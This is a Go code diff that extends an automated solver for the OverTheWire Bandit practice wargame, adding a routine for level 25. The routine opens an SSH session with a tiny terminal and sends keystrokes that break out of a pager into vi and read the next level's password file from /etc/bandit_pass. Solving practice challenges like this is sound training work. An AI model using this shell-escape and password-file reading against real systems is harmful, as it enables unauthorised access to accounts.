@@ -1,14 +1,19 @@
 package main
 
 import (
+	"bufio"
+	"bytes"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"os"
 	"strings"
+	"time"
+
+	"golang.org/x/crypto/ssh"
 
 	"github.com/MJKWoolnough/memio"
-	"github.com/MJKWoolnough/overthewire/ssh"
 )
 
 const (
@@ -111,6 +116,32 @@ var commands = [...]string{
 		"	echo %q\" $i\";" +
 		"	sleep 0.01s;" +
 		"done | nc 127.0.0.1 30002 | grep \"The password of user bandit25 is\" | cut -d' ' -f7",
+	//level 25 below
+}
+
+func RunCommands(server, username, password, commands string, stdout, stderr io.Writer) error {
+	s, err := ssh.Dial("tcp", server, &ssh.ClientConfig{
+		User:            username,
+		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	})
+	if err != nil {
+		return err
+	}
+	session, err := s.NewSession()
+	if err != nil {
+		return err
+	}
+
+	session.Stdout = stdout
+	session.Stderr = stderr
+
+	err = session.Run(commands)
+	session.Close()
+	if err != nil {
+		return err
+	}
+	return s.Close()
 }
 
 func main() {
@@ -133,17 +164,84 @@ func main() {
 			cmds = fmt.Sprintf(cmds, password)
 		}
 
-		err := ssh.RunCommands(host, fmt.Sprintf(username, n), password, cmds, &stdout, os.Stderr)
+		err := RunCommands(host, fmt.Sprintf(username, n), password, cmds, &stdout, os.Stderr)
 		if err != nil {
 			log.Printf("Level %2d: error: %s\n", n, err)
 			break
 		}
 		if string(stdout[:9]) != "Password:" || len(stdout) != 42 || stdout[41] != 10 {
 			log.Printf("Level %2d: invalid password: %s\n", n, stdout[9:])
-			break
+			return
 		}
 		password = string(stdout[9:41])
 		log.Printf("Level %2d: Password: %s\n", n, password)
 		stdout = stdout[:0]
 	}
+	//level 25
+	log.Printf("Level 25: Sending Commands...\n")
+	s, err := ssh.Dial("tcp", host, &ssh.ClientConfig{
+		User:            "bandit25",
+		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	})
+	if err != nil {
+		log.Printf("Level 25: error: %s\n", err)
+		return
+	}
+	session, err := s.NewSession()
+	if err != nil {
+		log.Printf("Level 25: error: %s\n", err)
+		return
+	}
+	if err = session.RequestPty("vt100", 2, 40, ssh.TerminalModes{
+		ssh.ECHO:          0,
+		ssh.TTY_OP_ISPEED: 14400,
+		ssh.TTY_OP_OSPEED: 14400,
+	}); err != nil {
+		log.Printf("Level 25: error: %s\n", err)
+		return
+	}
+	wc, _ := session.StdinPipe()
+	r, _ := session.StdoutPipe()
+	session.Shell()
+
+	pw := make(chan string)
+
+	go func() {
+		buf := bufio.NewReader(r)
+		i := 0
+		for {
+			b, err := buf.ReadBytes('\n')
+			if err == io.EOF {
+				break
+			} else if err != nil {
+				log.Printf("Level 25: error: %s\n", err)
+				close(pw)
+				return
+			}
+			if bytes.Contains(b, []byte("/etc/bandit_pass/bandit26")) {
+				index := bytes.Index(b, []byte("[1;1H"))
+				pw <- string(b[index+5 : index+37])
+				close(pw)
+				return
+			}
+			i++
+		}
+	}()
+
+	for _, cmd := range [...]string{
+		"ssh -o StrictHostKeyChecking=no -i bandit26.sshkey bandit26@localhost;exit\n",
+		"v",
+		":e /etc/bandit_pass/bandit26\n",
+		":q\n",
+		"q",
+	} {
+		wc.Write([]byte(cmd))
+		time.Sleep(time.Second)
+	}
+
+	log.Printf("Level 25: Password: %s\n", <-pw)
+	wc.Close()
+	session.Close()
+	s.Close()
 }
